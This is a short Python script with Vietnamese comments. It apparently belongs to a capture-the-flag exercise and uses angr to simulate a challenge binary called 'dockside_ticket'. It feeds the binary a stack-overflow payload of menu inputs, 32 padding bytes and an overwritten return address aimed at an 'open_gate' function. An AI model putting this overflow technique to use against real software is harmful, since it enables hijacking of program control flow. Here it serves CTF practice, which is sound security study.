"""Chay dockside_ticket bang angr de lay output that cua nhanh open_gate.

Ghi ro: day la phuong thuc duy nhat co the thuc thi ELF Linux tren may Windows
nay (khong co WSL distro nao dung duoc, Docker Desktop dang tat).
"""

import angr

BIN = r"C:\Users\Administrator\Downloads\CTFWU\CSS CTF 2026\_wip\dockside-ticket\files\dockside_ticket"
OPEN_GATE = 0x40125F

payload = b"1\n" + b"2\n" + b"3\n" + b"A" * 32 + OPEN_GATE.to_bytes(8, "little") + b"\n4\n5\n"

p = angr.Project(BIN, auto_libs=True)
state = p.factory.entry_state(stdin=payload)
sm = p.simulation_manager(state)
sm.explore(find=OPEN_GATE, avoid=[0x401236], timeout=180)

if sm.found:
    s = sm.found[0]
    print("dat open_gate sau %d buoc" % len(s.history.bbl_addrs))
    print("stdout:", s.posix.dumps(1))
    s2 = s.step()
    print("stdout sau 1 buoc:", s2.posix.dumps(1))
else:
    print("khong dat open_gate; active:", len(sm.active), "stashed:", len(sm.stashed))
    for a in list(sm.active)[:3]:
        print("  ip =", hex(a.solver.eval(a.regs.rip)), "stdin left =", a.posix.dumps(0))
